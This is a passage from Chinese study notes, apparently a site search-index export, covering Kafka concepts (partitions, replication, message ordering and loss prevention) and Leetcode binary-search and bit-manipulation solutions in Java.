相比其他消息队列主要的优势如下：\n 极致的性能 ：基于 Scala 和 Java 语言开发，设计中大量使用了批量处理和异步的思想，最高可以每秒处理千万级别的消息。 生态系统兼容性无可匹敌 ：Kafka 与周边生态系统的兼容性是最好的没有之一，尤其在大数据和流计算领域。  实际上在早期的时候 Kafka 并不是一个合格的消息队列，早期的 Kafka 在消息队列领域就像是一个衣衫褴褛的孩子一样，功能不完备并且有一些小问题比如丢失消息、不保证消息可靠性等等。当然，这也和 LinkedIn 最早开发 Kafka 用于处理海量的日志有很大关系，哈哈哈，人家本来最开始就不是为了作为消息队列滴，谁知道后面误打误撞在消息队列领域占据了一席之地。\n随着后续的发展，这些短板都被 Kafka 逐步修复完善。所以，Kafka 作为消息队列不可靠这个说法已经过时！\n队列模型了解吗？Kafka 的消息模型知道吗？     题外话：早期的 JMS 和 AMQP 属于消息服务领域权威组织所做的相关的标准，我在 JavaGuide的 《消息队列其实很简单》这篇文章中介绍过。但是，这些标准的进化跟不上消息队列的演进速度，这些标准实际上已经属于废弃状态。所以，可能存在的情况是：不同的消息队列都有自己的一套消息模型。\n 队列模型：早期的消息模型    使用队列（Queue）作为消息通信载体，满足生产者与消费者模式，一条消息只能被一个消费者使用，未被消费的消息在队列中保留直到被消费或超时。 比如：我们生产者发送 100 条消息的话，两个消费者来消费一般情况下两个消费者会按照消息发送的顺序各自消费一半（也就是你一个我一个的消费。）\n队列模型存在的问题：\n假如我们存在这样一种情况：我们需要将生产者产生的消息分发给多个消费者，并且每个消费者都能接收到完整的消息内容。\n这种情况，队列模型就不好解决了。很多比较杠精的人就说：我们可以为每个消费者创建一个单独的队列，让生产者发送多份。这是一种非常愚蠢的做法，浪费资源不说，还违背了使用消息队列的目的。\n发布-订阅模型:Kafka 消息模型    发布-订阅模型主要是为了解决队列模型存在的问题。\n发布订阅模型（Pub-Sub） 使用主题（Topic） 作为消息通信载体，类似于广播模式；发布者发布一条消息，该消息通过主题传递给所有的订阅者，在一条消息广播之后才订阅的用户则是收不到该条消息的。\n在发布 - 订阅模型中，如果只有一个订阅者，那它和队列模型就基本是一样的了。所以说，发布 - 订阅模型在功能层面上是可以兼容队列模型的。\nKafka 采用的就是发布 - 订阅模型。\n RocketMQ 的消息模型和 Kafka 基本是完全一样的。唯一的区别是 Kafka 中没有队列这个概念，与之对应的是 Partition（分区）。\n 什么是Producer、Consumer、Broker、Topic、Partition？    Kafka 将生产者发布的消息发送到 Topic（主题） 中，需要这些消息的消费者可以订阅这些 Topic（主题），如下图所示：\n上面这张图也为我们引出了，Kafka 比较重要的几个概念：\n Producer（生产者） : 产生消息的一方。 Consumer（消费者） : 消费消息的一方。 Broker（代理） : 可以看作是一个独立的 Kafka 实例。多个 Kafka Broker 组成一个 Kafka Cluster。  同时，你一定也注意到每个 Broker 中又包含了 Topic 以及 Partition 这两个重要的概念：\n Topic（主题） : Producer 将消息发送到特定的主题，Consumer 通过订阅特定的 Topic(主题) 来消费消息。 Partition（分区） : Partition 属于 Topic 的一部分。一个 Topic 可以有多个 Partition ，并且同一 Topic 下的 Partition 可以分布在不同的 Broker 上，这也就表明一个 Topic 可以横跨多个 Broker 。这正如我上面所画的图一样。   划重点：Kafka 中的 Partition（分区） 实际上可以对应成为消息队列中的队列。这样是不是更好理解一点？\n Kafka 的多副本机制了解吗？带来了什么好处？    还有一点我觉得比较重要的是 Kafka 为分区（Partition）引入了多副本（Replica）机制。分区（Partition）中的多个副本之间会有一个叫做 leader 的家伙，其他副本称为 follower。我们发送的消息会被发送到 leader 副本，然后 follower 副本才能从 leader 副本中拉取消息进行同步。\n 生产者和消费者只与 leader 副本交互。你可以理解为其他副本只是 leader 副本的拷贝，它们的存在只是为了保证消息存储的安全性。当 leader 副本发生故障时会从 follower 中选举出一个 leader,但是 follower 中如果有和 leader 同步程度达不到要求的参加不了 leader 的竞选。\n Kafka 的多分区（Partition）以及多副本（Replica）机制有什么好处呢？\n Kafka 通过给特定 Topic 指定多个 Partition, 而各个 Partition 可以分布在不同的 Broker 上, 这样便能提供比较好的并发能力（负载均衡）。 Partition 可以指定对应的 Replica 数, 这也极大地提高了消息存储的安全性, 提高了容灾能力，不过也相应的增加了所需要的存储空间。  Zookeeper 在 Kafka 中的作用知道吗？     要想搞懂 zookeeper 在 Kafka 中的作用 一定要自己搭建一个 Kafka 环境然后自己进 zookeeper 去看一下有哪些文件夹和 Kafka 有关，每个节点又保存了什么信息。 一定不要光看不实践，这样学来的也终会忘记！这部分内容参考和借鉴了这篇文章：https://www.jianshu.com/p/a036405f989c 。\n 下图就是我的本地 Zookeeper ，它成功和我本地的 Kafka 关联上（以下文件夹结构借助 idea 插件 Zookeeper tool 实现）。\nZooKeeper 主要为 Kafka 提供元数据的管理的功能。\n从图中我们可以看出，Zookeeper 主要为 Kafka 做了下面这些事情：\n Broker 注册 ：在 Zookeeper 上会有一个专门用来进行 Broker 服务器列表记录的节点。每个 Broker 在启动时，都会到 Zookeeper 上进行注册，即到 /brokers/ids 下创建属于自己的节点。每个 Broker 就会将自己的 IP 地址和端口等信息记录到该节点中去 Topic 注册 ： 在 Kafka 中，同一个Topic 的消息会被分成多个分区并将其分布在多个 Broker 上，这些分区信息及与 Broker 的对应关系也都是由 Zookeeper 在维护。比如我创建了一个名字为 my-topic 的主题并且它有两个分区，对应到 zookeeper 中会创建这些文件夹：/brokers/topics/my-topic/Partitions/0、/brokers/topics/my-topic/Partitions/1 负载均衡 ：上面也说过了 Kafka 通过给特定 Topic 指定多个 Partition, 而各个 Partition 可以分布在不同的 Broker 上, 这样便能提供比较好的并发能力。 对于同一个 Topic 的不同 Partition，Kafka 会尽力将这些 Partition 分布到不同的 Broker 服务器上。当生产者产生消息后也会尽量投递到不同 Broker 的 Partition 里面。当 Consumer 消费的时候，Zookeeper 可以根据当前的 Partition 数量以及 Consumer 数量来实现动态负载均衡。 \u0026hellip;\u0026hellip;  Kafka 如何保证消息的消费顺序？    我们在使用消息队列的过程中经常有业务场景需要严格保证消息的消费顺序，比如我们同时发了 2 个消息，这 2 个消息对应的操作分别对应的数据库操作是：\n 更改用户会员等级。 根据会员等级计算订单价格。  假如这两条消息的消费顺序不一样造成的最终结果就会截然不同。\n我们知道 Kafka 中 Partition(分区)是真正保存消息的地方，我们发送的消息都被放在了这里。而我们的 Partition(分区) 又存在于 Topic(主题) 这个概念中，并且我们可以给特定 Topic 指定多个 Partition。\n每次添加消息到 Partition(分区) 的时候都会采用尾加法，如上图所示。 Kafka 只能为我们保证 Partition(分区) 中的消息有序。\n 消息在被追加到 Partition(分区)的时候都会分配一个特定的偏移量（offset）。Kafka 通过偏移量（offset）来保证消息在分区内的顺序性。\n 所以，我们就有一种很简单的保证消息消费顺序的方法：1 个 Topic 只对应一个 Partition。这样当然可以解决问题，但是破坏了 Kafka 的设计初衷。\nKafka 中发送 1 条消息的时候，可以指定 topic, partition, key,data（数据） 4 个参数。如果你发送消息的时候指定了 Partition 的话，所有消息都会被发送到指定的 Partition。并且，同一个 key 的消息可以保证只发送到同一个 partition，这个我们可以采用表/对象的 id 来作为 key 。\n总结一下，对于如何保证 Kafka 中消息消费的顺序，有了下面两种方法：\n 1 个 Topic 只对应一个 Partition。 （推荐）发送消息的时候指定 key/Partition。  当然不仅仅只有上面两种方法，上面两种方法是我觉得比较好理解的，\nKafka 如何保证消息不丢失    生产者丢失消息的情况    生产者(Producer) 调用send方法发送消息之后，消息可能因为网络问题并没有发送过去。\n所以，我们不能默认在调用send方法发送消息之后消息发送成功了。为了确定消息是发送成功，我们要判断消息发送的结果。但是要注意的是 Kafka 生产者(Producer) 使用 send 方法发送消息实际上是异步的操作，我们可以通过 get()方法获取调用结果，但是这样也让它变为了同步操作，示例代码如下：\n 详细代码见我的这篇文章：Kafka系列第三篇！10 分钟学会如何在 Spring Boot 程序中使用 Kafka 作为消息队列?\n SendResult\u0026lt;String, Object\u0026gt; sendResult = kafkaTemplate.send(topic, o).get(); if (sendResult.getRecordMetadata() != null) { logger.info(\u0026#34;生产者成功发送消息到\u0026#34; + sendResult.getProducerRecord().topic() + \u0026#34;-\u0026gt; \u0026#34; + sendRe sult.getProducerRecord().value().toString()); } 但是一般不推荐这么做！可以采用为其添加回调函数的形式，示例代码如下：\nListenableFuture\u0026lt;SendResult\u0026lt;String, Object\u0026gt;\u0026gt; future = kafkaTemplate.send(topic, o); future.addCallback(result -\u0026gt; logger.info(\u0026#34;生产者成功发送消息到topic:{} partition:{}的消息\u0026#34;, result.getRecordMetadata().topic(), result.getRecordMetadata().partition()), ex -\u0026gt; logger.error(\u0026#34;生产者发送消失败，原因：{}\u0026#34;, ex.getMessage())); 如果消息发送失败的话，我们检查失败的原因之后重新发送即可！\n另外这里推荐为 Producer 的retries （重试次数）设置一个比较合理的值，一般是 3 ，但是为了保证消息不丢失的话一般会设置比较大一点。设置完成之后，当出现网络问题之后能够自动重试消息发送，避免消息丢失。另外，建议还要设置重试间隔，因为间隔太小的话重试的效果就不明显了，网络波动一次你3次一下子就重试完了\n消费者丢失消息的情况    我们知道消息在被追加到 Partition(分区)的时候都会分配一个特定的偏移量（offset）。偏移量（offset)表示 Consumer 当前消费到的 Partition(分区)的所在的位置。Kafka 通过偏移量（offset）可以保证消息在分区内的顺序性。\n当消费者拉取到了分区的某个消息之后，消费者会自动提交了 offset。自动提交的话会有一个问题，试想一下，当消费者刚拿到这个消息准备进行真正消费的时候，突然挂掉了，消息实际上并没有被消费，但是 offset 却被自动提交了。\n解决办法也比较粗暴，我们手动关闭自动提交 offset，每次在真正消费完消息之后再自己手动提交 offset 。 但是，细心的朋友一定会发现，这样会带来消息被重新消费的问题。比如你刚刚消费完消息之后，还没提交 offset，结果自己挂掉了，那么这个消息理论上就会被消费两次。\nKafka 弄丢了消息    我们知道 Kafka 为分区（Partition）引入了多副本（Replica）机制。分区（Partition）中的多个副本之间会有一个叫做 leader 的家伙，其他副本称为 follower。我们发送的消息会被发送到 leader 副本，然后 follower 副本才能从 leader 副本中拉取消息进行同步。生产者和消费者只与 leader 副本交互。你可以理解为其他副本只是 leader 副本的拷贝，它们的存在只是为了保证消息存储的安全性。\n试想一种情况：假如 leader 副本所在的 broker 突然挂掉，那么就要从 follower 副本重新选出一个 leader ，但是 leader 的数据还有一些没有被 follower 副本的同步的话，就会造成消息丢失。\n设置 acks = all\n解决办法就是我们设置 acks = all。acks 是 Kafka 生产者(Producer) 很重要的一个参数。\nacks 的默认值即为1，代表我们的消息被leader副本接收之后就算被成功发送。当我们配置 acks = all 代表则所有副本都要接收到该消息之后该消息才算真正成功被发送。\n设置 replication.factor \u0026gt;= 3\n为了保证 leader 副本能有 follower 副本能同步消息，我们一般会为 topic 设置 replication.factor \u0026gt;= 3。这样就可以保证每个 分区(partition) 至少有 3 个副本。虽然造成了数据冗余，但是带来了数据的安全性。\n设置 min.insync.replicas \u0026gt; 1\n一般情况下我们还需要设置 min.insync.replicas\u0026gt; 1 ，这样配置代表消息至少要被写入到 2 个副本才算是被成功发送。min.insync.replicas 的默认值为 1 ，在实际生产中应尽量避免默认值 1。\n但是，为了保证整个 Kafka 服务的高可用性，你需要确保 replication.factor \u0026gt; min.insync.replicas 。为什么呢？设想一下假如两者相等的话，只要是有一个副本挂掉，整个分区就无法正常工作了。这明显违反高可用性！一般推荐设置成 replication.factor = min.insync.replicas + 1。\n设置 unclean.leader.election.enable = false\n Kafka 0.11.0.0版本开始 unclean.leader.election.enable 参数的默认值由原来的true 改为false\n 我们最开始也说了我们发送的消息会被发送到 leader 副本，然后 follower 副本才能从 leader 副本中拉取消息进行同步。多个 follower 副本之间的消息同步情况不一样，当我们配置了 unclean.leader.election.enable = false 的话，当 leader 副本发生故障时就不会从 follower 副本中和 leader 同步程度达不到要求的副本中选择出 leader ，这样降低了消息丢失的可能性。\nKafka 如何保证消息不重复消费    kafka出现消息重复消费的原因：\n 服务端侧已经消费的数据没有成功提交 offset（根本原因）。 Kafka 侧 由于服务端处理业务时间长或者网络链接等等原因让 Kafka 认为服务假死，触发了分区 rebalance。  解决方案：\n 消费消息服务做幂等校验，比如 Redis 的set、MySQL 的主键等天然的幂等功能。这种方法最有效。 将 enable.auto.commit 参数设置为 false，关闭自动提交，开发者在代码中手动提交 offset。那么这里会有个问题：什么时候提交offset合适？  处理完消息再提交：依旧有消息重复消费的风险，和自动提交一样 拉取到消息即提交：会有消息丢失的风险。允许消息延时的场景，一般会采用这种方式。然后，通过定时任务在业务不繁忙（比如凌晨）的时候做数据兜底。    Reference     Kafka 官方文档： https://kafka.apache.org/documentation/ 极客时间—《Kafka核心技术与实战》第11节：无消息丢失配置怎么实现？  "},{"id":239,"href":"/%E7%AC%94%E8%AE%B0/Leetcode%E9%A2%98%E8%A7%A3/LeetcodeLeetcode-%E9%A2%98%E8%A7%A3/","title":"Leetcode 题解","parent":"Leetcode题解","content":"Leetcode 题解\n"},{"id":240,"href":"/%E7%AC%94%E8%AE%B0/Leetcode-/LeetcodeLeetcode-%E9%A2%98%E8%A7%A3-%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/","title":"Leetcode 题解 - 二分查找","parent":"笔记","content":"Leetcode 题解 - 二分查找     Leetcode 题解 - 二分查找  1. 求开方 2. 大于给定元素的最小元素 3. 有序数组的 Single Element 4. 第一个错误的版本 5. 旋转数组的最小数字 6. 查找区间    正常实现\nInput : [1,2,3,4,5] key : 3 return the index : 2 public int binarySearch(int[] nums, int key) { int l = 0, h = nums.length - 1; while (l \u0026lt;= h) { int m = l + (h - l) / 2; if (nums[m] == key) { return m; } else if (nums[m] \u0026gt; key) { h = m - 1; } else { l = m + 1; } } return -1; } 时间复杂度\n二分查找也称为折半查找，每次都能将查找区间减半，这种折半特性的算法时间复杂度为 O(logN)。\nm 计算\n有两种计算中值 m 的方式：\n m = (l + h) / 2 m = l + (h - l) / 2  l + h 可能出现加法溢出，也就是说加法的结果大于整型能够表示的范围。但是 l 和 h 都为正数，因此 h - l 不会出现加法溢出问题。所以，最好使用第二种计算法方法。\n未成功查找的返回值\n循环退出时如果仍然没有查找到 key，那么表示查找失败。可以有两种返回值：\n -1：以一个错误码表示没有查找到 key l：将 key 插入到 nums 中的正确位置  变种\n二分查找可以有很多变种，实现变种要注意边界值的判断。例如在一个有重复元素的数组中查找 key 的最左位置的实现如下：\npublic int binarySearch(int[] nums, int key) { int l = 0, h = nums.length; while (l \u0026lt; h) { int m = l + (h - l) / 2; if (nums[m] \u0026gt;= key) { h = m; } else { l = m + 1; } } return l; } 该实现和正常实现有以下不同：\n h 的赋值表达式为 h = m 循环条件为 l \u0026lt; h 最后返回 l 而不是 -1  在 nums[m] \u0026gt;= key 的情况下，可以推导出最左 key 位于 [l, m] 区间中，这是一个闭区间。h 的赋值表达式为 h = m，因为 m 位置也可能是解。\n在 h 的赋值表达式为 h = m 的情况下，如果循环条件为 l \u0026lt;= h，那么会出现循环无法退出的情况，因此循环条件只能是 l \u0026lt; h。以下演示了循环条件为 l \u0026lt;= h 时循环无法退出的情况：\nnums = {0, 1, 2}, key = 1 l m h 0 1 2 nums[m] \u0026gt;= key 0 0 1 nums[m] \u0026lt; key 1 1 1 nums[m] \u0026gt;= key 1 1 1 nums[m] \u0026gt;= key ... 当循环体退出时，不表示没有查找到 key，因此最后返回的结果不应该为 -1。为了验证有没有查找到，需要在调用端判断一下返回位置上的值和 key 是否相等。\n1. 求开方    69. Sqrt(x) (Easy)\nLeetcode / 力扣\nInput: 4 Output: 2 Input: 8 Output: 2 Explanation: The square root of 8 is 2.82842..., and since we want to return an integer, the decimal part will be truncated. 一个数 x 的开方 sqrt 一定在 0 ~ x 之间，并且满足 sqrt == x / sqrt。可以利用二分查找在 0 ~ x 之间查找 sqrt。\n对于 x = 8，它的开方是 2.82842\u0026hellip;，最后应该返回 2 而不是 3。在循环条件为 l \u0026lt;= h 并且循环退出时，h 总是比 l 小 1，也就是说 h = 2，l = 3，因此最后的返回值应该为 h 而不是 l。\npublic int mySqrt(int x) { if (x \u0026lt;= 1) { return x; } int l = 1, h = x; while (l \u0026lt;= h) { int mid = l + (h - l) / 2; int sqrt = x / mid; if (sqrt == mid) { return mid; } else if (mid \u0026gt; sqrt) { h = mid - 1; } else { l = mid + 1; } } return h; } 2. 大于给定元素的最小元素    744. Find Smallest Letter Greater Than Target (Easy)\nLeetcode / 力扣\nInput: letters = [\u0026#34;c\u0026#34;, \u0026#34;f\u0026#34;, \u0026#34;j\u0026#34;] target = \u0026#34;d\u0026#34; Output: \u0026#34;f\u0026#34; Input: letters = [\u0026#34;c\u0026#34;, \u0026#34;f\u0026#34;, \u0026#34;j\u0026#34;] target = \u0026#34;k\u0026#34; Output: \u0026#34;c\u0026#34; 题目描述：给定一个有序的字符数组 letters 和一个字符 target，要求找出 letters 中大于 target 的最小字符，如果找不到就返回第 1 个字符。\npublic char nextGreatestLetter(char[] letters, char target) { int n = letters.length; int l = 0, h = n - 1; while (l \u0026lt;= h) { int m = l + (h - l) / 2; if (letters[m] \u0026lt;= target) { l = m + 1; } else { h = m - 1; } } return l \u0026lt; n ? letters[l] : letters[0]; } 3. 有序数组的 Single Element    540. Single Element in a Sorted Array (Medium)\nLeetcode / 力扣\nInput: [1, 1, 2, 3, 3, 4, 4, 8, 8] Output: 2 题目描述：一个有序数组只有一个数不出现两次，找出这个数。\n要求以 O(logN) 时间复杂度进行求解，因此不能遍历数组并进行异或操作来求解，这么做的时间复杂度为 O(N)。\n令 index 为 Single Element 在数组中的位置。在 index 之后，数组中原来存在的成对状态被改变。如果 m 为偶数，并且 m + 1 \u0026lt; index，那么 nums[m] == nums[m + 1]；m + 1 \u0026gt;= index，那么 nums[m] != nums[m + 1]。\n从上面的规律可以知道，如果 nums[m] == nums[m + 1]，那么 index 所在的数组位置为 [m + 2, h]，此时令 l = m + 2；如果 nums[m] != nums[m + 1]，那么 index 所在的数组位置为 [l, m]，此时令 h = m。\n因为 h 的赋值表达式为 h = m，那么循环条件也就只能使用 l \u0026lt; h 这种形式。\npublic int singleNonDuplicate(int[] nums) { int l = 0, h = nums.length - 1; while (l \u0026lt; h) { int m = l + (h - l) / 2; if (m % 2 == 1) { m--; // 保证 l/h/m 都在偶数位，使得查找区间大小一直都是奇数  } if (nums[m] == nums[m + 1]) { l = m + 2; } else { h = m; } } return nums[l]; } 4. 第一个错误的版本    278. First Bad Version (Easy)\nLeetcode / 力扣\n题目描述：给定一个元素 n 代表有 [1, 2, \u0026hellip;, n] 版本，在第 x 位置开始出现错误版本，导致后面的版本都错误。可以调用 isBadVersion(int x) 知道某个版本是否错误，要求找到第一个错误的版本。\n如果第 m 个版本出错，则表示第一个错误的版本在 [l, m] 之间，令 h = m；否则第一个错误的版本在 [m + 1, h] 之间，令 l = m + 1。\n因为 h 的赋值表达式为 h = m，因此循环条件为 l \u0026lt; h。\npublic int firstBadVersion(int n) { int l = 1, h = n; while (l \u0026lt; h) { int mid = l + (h - l) / 2; if (isBadVersion(mid)) { h = mid; } else { l = mid + 1; } } return l; } 5. 旋转数组的最小数字    153. Find Minimum in Rotated Sorted Array (Medium)\nLeetcode / 力扣\nInput: [3,4,5,1,2], Output: 1 public int findMin(int[] nums) { int l = 0, h = nums.length - 1; while (l \u0026lt; h) { int m = l + (h - l) / 2; if (nums[m] \u0026lt;= nums[h]) { h = m; } else { l = m + 1; } } return nums[l]; } 6. 查找区间    34. Find First and Last Position of Element in Sorted Array\nLeetcode / 力扣\nInput: nums = [5,7,7,8,8,10], target = 8 Output: [3,4] Input: nums = [5,7,7,8,8,10], target = 6 Output: [-1,-1] 题目描述：给定一个有序数组 nums 和一个目标 target，要求找到 target 在 nums 中的第一个位置和最后一个位置。\n可以用二分查找找出第一个位置和最后一个位置，但是寻找的方法有所不同，需要实现两个二分查找。我们将寻找 target 最后一个位置，转换成寻找 target+1 第一个位置，再往前移动一个位置。这样我们只需要实现一个二分查找代码即可。\npublic int[] searchRange(int[] nums, int target) { int first = findFirst(nums, target); int last = findFirst(nums, target + 1) - 1; if (first == nums.length || nums[first] != target) { return new int[]{-1, -1}; } else { return new int[]{first, Math.max(first, last)}; } } private int findFirst(int[] nums, int target) { int l = 0, h = nums.length; // 注意 h 的初始值  while (l \u0026lt; h) { int m = l + (h - l) / 2; if (nums[m] \u0026gt;= target) { h = m; } else { l = m + 1; } } return l; } 在寻找第一个位置的二分查找代码中，需要注意 h 的取值为 nums.length，而不是 nums.length - 1。先看以下示例：\nnums = [2,2], target = 2 如果 h 的取值为 nums.length - 1，那么 last = findFirst(nums, target + 1) - 1 = 1 - 1 = 0。这是因为 findLeft 只会返回 [0, nums.length - 1] 范围的值，对于 findFirst([2,2], 3) ，我们希望返回 3 插入 nums 中的位置，也就是数组最后一个位置再往后一个位置，即 nums.length。所以我们需要将 h 取值为 nums.length，从而使得 findFirst返回的区间更大，能够覆盖 target 大于 nums 最后一个元素的情况。\n"},{"id":241,"href":"/%E7%AC%94%E8%AE%B0/Leetcode-/LeetcodeLeetcode-%E9%A2%98%E8%A7%A3-%E4%BD%8D%E8%BF%90%E7%AE%97/","title":"Leetcode 题解 - 位运算","parent":"笔记","content":"Leetcode 题解 - 位运算     Leetcode 题解 - 位运算  0. 原理 1. 统计两个数的二进制表示有多少位不同 2. 数组中唯一一个不重复的元素 3. 找出数组中缺失的那个数 4. 数组中不重复的两个元素 5. 翻转一个数的比特位 6. 不用额外变量交换两个整数 7. 判断一个数是不是 2 的 n 次方 8. 判断一个数是不是 4 的 n 次方 9. 判断一个数的位级表示是否不会出现连续的 0 和 1 10. 求一个数的补码 11. 实现整数的加法 12. 字符串数组最大乘积 13. 统计从 0 ~ n 每个数的二进制表示中 1 的个数    0. 原理    基本原理\n0s 表示一串 0，1s 表示一串 1。\nx ^ 0s = x x \u0026amp; 0s = 0 x | 0s = x x ^ 1s = ~x x \u0026amp; 1s = x x | 1s = 1s x ^ x = 0 x \u0026amp; x = x x | x = x 利用 x ^ 1s = ~x 的特点，可以将一个数的位级表示翻转；利用 x ^ x = 0 的特点，可以将三个数中重复的两个数去除，只留下另一个数。\n1^1^2 = 2 利用 x \u0026amp; 0s = 0 和 x \u0026amp; 1s = x 的特点，可以实现掩码操作。一个数 num 与 mask：00111100 进行位与操作，只保留 num 中与 mask 的 1 部分相对应的位。\n01011011 \u0026amp; 00111100 -------- 00011000 利用 x | 0s = x 和 x | 1s = 1s 的特点，可以实现设值操作。一个数 num 与 mask：00111100 进行位或操作，将 num 中与 mask 的 1 部分相对应的位都设置为 1。\n01011011 | 00111100 -------- 01111111 位与运算技巧\nn\u0026amp;(n-1) 去除 n 的位级表示中最低的那一位 1。例如对于二进制表示 01011011，减去 1 得到 01011010，这两个数相与得到 01011010。\n01011011 \u0026amp; 01011010 -------- 01011010 n\u0026amp;(-n) 得到 n 的位级表示中最低的那一位 1。-n 得到 n 的反码加 1，也就是 -n=~n+1。例如对于二进制表示 10110100，-n 得到 01001100，相与得到 00000100。\n10110100 \u0026amp; 01001100 -------- 00000100 n-(n\u0026amp;(-n)) 则可以去除 n 的位级表示中最低的那一位 1，和 n\u0026amp;(n-1) 效果一样。\n移位运算\n\\\u0026gt;\\\u0026gt; n 为算术右移，相当于除以 2n，例如 -7 \\\u0026gt;\\\u0026gt; 2 = -2。\n11111111111111111111111111111001 \u0026gt;\u0026gt; 2 -------- 11111111111111111111111111111110 \\\u0026gt;\\\u0026gt;\\\u0026gt; n 为无符号右移，左边会补上 0。例如 -7 \\\u0026gt;\\\u0026gt;\\\u0026gt; 2 = 1073741822。\n11111111111111111111111111111001 \u0026gt;\u0026gt;\u0026gt; 2 -------- 00111111111111111111111111111111 \u0026lt;\u0026lt; n 为算术左移，相当于乘以 2n。-7 \u0026lt;\u0026lt; 2 = -28。\n11111111111111111111111111111001 \u0026lt;\u0026lt; 2 -------- 11111111111111111111111111100100 mask 计算\n要获取 111111111，将 0 取反即可，~0。\n要得到只有第 i 位为 1 的 mask，将 1 向左移动 i-1 位即可，1\u0026lt;\u0026lt;(i-1) 。例如 1\u0026lt;\u0026lt;4 得到只有第 5 位为 1 的 mask ：00010000。\n要得到 1 到 i 位为 1 的 mask，(1\u0026lt;\u0026lt;i)-1 即可，例如将 (1\u0026lt;\u0026lt;4)-1 = 00010000-1 = 00001111。\n要得到 1 到 i 位为 0 的 mask，只需将 1 到 i 位为 1 的 mask 取反，即 ~((1\u0026lt;\u0026lt;i)-1)。\nJava 中的位操作\nstatic int Integer.bitCount(); // 统计 1 的数量 static int Integer.highestOneBit(); // 获得最高位 static String toBinaryString(int i); // 转换为二进制表示的字符串 1. 统计两个数的二进制表示有多少位不同    Hamming Distance (Easy)  Leetcode / 力扣\nInput: x = 1, y = 4 Output: 2 Explanation: 1 (0 0 0 1) 4 (0 1 0 0) ↑ ↑ The above arrows point to positions where the corresponding bits are different. 对两个数进行异或操作，位级表示不同的那一位为 1，统计有多少个 1 即可。\npublic int hammingDistance(int x, int y) { int z = x ^ y; int cnt = 0; while(z != 0) { if ((z \u0026amp; 1) == 1) cnt++; z = z \u0026gt;\u0026gt; 1; } return cnt; } 使用 z\u0026amp;(z-1) 去除 z 位级表示最低的那一位。\npublic int hammingDistance(int x, int y) { int z = x ^ y; int cnt = 0; while (z != 0) { z \u0026amp;= (z - 1); cnt++; } return cnt; } 可以使用 Integer.bitcount() 来统计 1 个的个数。\npublic int hammingDistance(int x, int y) { return Integer.bitCount(x ^ y); } 2. 数组中唯一一个不重复的元素    136. Single Number (Easy)\nLeetcode / 力扣\nInput: [4,1,2,1,2] Output: 4 两个相同的数异或的结果为 0，对所有数进行异或操作，最后的结果就是单独出现的那个数。\npublic int singleNumber(int[] nums) { int ret = 0; for (int n : nums) ret = ret ^ n; return ret; } 3. 找出数组中缺失的那个数    268. Missing Number (Easy)\nLeetcode / 力扣\nInput: [3,0,1] Output: 2 题目描述：数组元素在 0-n 之间，但是有一个数是缺失的，要求找到这个缺失的数。\npublic int missingNumber(int[] nums) { int ret = 0; for (int i = 0; i \u0026lt; nums.length; i++) { ret = ret ^ i ^ nums[i]; } return ret ^ nums.length; } 4. 数组中不重复的两个元素    260. Single Number III (Medium)\nLeetcode / 力扣\n两个不相等的元素在位级表示上必定会有一位存在不同。\n将数组的所有元素异或得到的结果为不存在重复的两个元素异或的结果。\ndiff \u0026amp;= -diff 得到出 diff 最右侧不为 0 的位，也就是不存在重复的两个元素在位级表示上最右侧不同的那一位，利用这一位就可以将两个元素区分开来。\npublic int[] singleNumber(int[] nums) { int diff = 0; for (int num : nums) diff ^= num; diff \u0026amp;= -diff; // 得到最右一位  int[] ret = new int[2]; for (int num : nums) { if ((num \u0026amp; diff) == 0) ret[0] ^= num; else ret[1] ^= num; } return ret; } 5. 翻转一个数的比特位    190. Reverse Bits (Easy)\nLeetcode / 力扣\npublic int reverseBits(int n) { int ret = 0; for (int i = 0; i \u0026lt; 32; i++) { ret \u0026lt;\u0026lt;= 1; ret |= (n \u0026amp; 1); n \u0026gt;\u0026gt;\u0026gt;= 1; } return ret; } 如果该函数需要被调用很多次，可以将 int 拆成 4 个 byte，然后缓存 byte 对应的比特位翻转，最后再拼接起来。\nprivate static Map\u0026lt;Byte, Integer\u0026gt; cache = new HashMap\u0026lt;\u0026gt;(); public int reverseBits(int n) { int ret = 0; for (int i = 0; i \u0026lt; 4; i++) { ret \u0026lt;\u0026lt;= 8; ret |= reverseByte((byte) (n \u0026amp; 0b11111111)); n \u0026gt;\u0026gt;= 8; } return ret; } private int reverseByte(byte b) { if (cache.containsKey(b)) return cache.get(b); int ret = 0; byte t = b; for (int i = 0; i \u0026lt; 8; i++) { ret \u0026lt;\u0026lt;= 1; ret |= t \u0026amp; 1; t \u0026gt;\u0026gt;= 1; } cache.put(b, ret); return ret; } 6. 不用额外变量交换两个整数    程序员代码面试指南 ：P317\na = a ^ b; b = a ^ b; a = a ^ b; 7. 判断一个数是不是 2 的 n 次方    231. Power of Two (Easy)\nLeetcode / 力扣\n二进制表示只有一个 1 存在。\npublic boolean isPowerOfTwo(int n) { return n \u0026gt; 0 \u0026amp;\u0026amp; Integer.bitCount(n) == 1; } 利用 1000 \u0026amp; 0111 == 0 这种性质，得到以下解法：\npublic boolean isPowerOfTwo(int n) { return n \u0026gt; 0 \u0026amp;\u0026amp; (n \u0026amp; (n - 1)) == 0; } 8. 判断一个数是不是 4 的 n 次方    342. Power of Four (Easy)\nLeetcode / 力扣\n这种数在二进制表示中有且只有一个奇数位为 1，例如 16（10000）。\npublic boolean isPowerOfFour(int num) { return num \u0026gt; 0 \u0026amp;\u0026amp; (num \u0026amp; (num - 1)) == 0 \u0026amp;\u0026amp; (num \u0026amp; 0b01010101010101010101010101010101) != 0; } 也可以使用正则表达式进行匹配。\npublic boolean isPowerOfFour(int num) { return Integer.toString(num, 4).matches(\u0026#34;10*\u0026#34;); } 9. 判断一个数的位级表示是否不会出现连续的 0 和 1    693. Binary Number with Alternating Bits (Easy)\nLeetcode / 力扣\nInput: 10 Output: True Explanation: The binary representation of 10 is: 1010. Input: 11 Output: False Explanation: The binary representation of 11 is: 1011. 对于 1010 这种位级表示的数，把它向右移动 1 位得到 101，这两个数每个位都不同，因此异或得到的结果为 1111。\npublic boolean hasAlternatingBits(int n) { int a = (n ^ (n \u0026gt;\u0026gt; 1)); return (a \u0026amp; (a + 1)) == 0; } 10. 求一个数的补码    476. Number Complement (Easy)\nLeetcode / 力扣\nInput: 5 Output: 2 Explanation: The binary representation of 5 is 101 (no leading zero bits), and its complement is 010. So you need to output 2. 题目描述：不考虑二进制表示中的首 0 部分。\n对于 00000101，要求补码可以将它与 00000111 进行异或操作。那么问题就转换为求掩码 00000111。\npublic int findComplement(int num) { if (num == 0) return 1; int mask = 1 \u0026lt;\u0026lt; 30; while ((num 